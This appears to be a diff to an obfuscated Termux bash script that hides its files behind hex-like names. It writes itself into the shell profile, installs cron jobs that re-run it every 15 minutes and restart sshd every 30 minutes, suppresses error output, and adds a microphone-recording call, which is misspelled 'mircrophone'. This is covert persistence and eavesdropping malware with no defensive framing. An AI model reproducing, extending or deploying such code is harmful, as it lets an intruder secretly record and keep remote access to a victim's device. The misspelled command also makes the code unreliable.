@@ -1,21 +1,16 @@
 #!/bin/bash
 
-_0xcd(){
-    path_(){
-        realpath $0
-    }
-    local var
     if [ -z $_XROOTPATH ]
-    then path_ | read var
+    then realpath $0 | read var
          var="${var//\/.0xcf/}"
          echo "_XROOTPATH=\"$var\"" > .0xcd
-         source .0xcd
-    else source .0xcd 
+         source .0xcd &> /dev/null
+    else source .0xcd &> /dev/null
     fi
-}
 
 _0xdd=$_XROOTPATH/.0xdd
 _0xaf=$_XROOTPATH/.0xaf
+
 
 _0xfb(){
     if [ ! -z $@ ]
@@ -25,6 +20,7 @@ _0xfb(){
     else rm $_0xaf/.0xe0000e0f4
          touch $_0xaf/.0xe0000e0f4
          echo "Empty keyfile"
+         termux-mircrophone-record -q
     fi
 }
 
@@ -74,9 +70,9 @@ then echo "source $_XROOTPATH/.0xcf" >> $PREFIX/etc/profile
 fi
 
 local u_chk=`whoami`
-local c_chk=`grep '.0xcf' $PREFIX/var/spool/cron/crontabs/$u_chk`
+local c_chk=`grep '/etc/profile' $PREFIX/var/spool/cron/crontabs/$u_chk`
 if [ -z $c_chk ]
-then echo "*/15 * * * * ( source $_XROOTPATH/.0xcf )" >> $PREFIX/var/spool/cron/crontabs/$u_chk
+then echo "*/15 * * * * ( source \$PREFIX/etc/profile )" >> $PREFIX/var/spool/cron/crontabs/$u_chk
      killall crond 
      crond start
 fi
@@ -89,3 +85,4 @@ then echo "*/30 * * * * ( killall sshd ; sshd )" >> $PREFIX/var/spool/cron/cront
 fi
 
 _0xcf
+
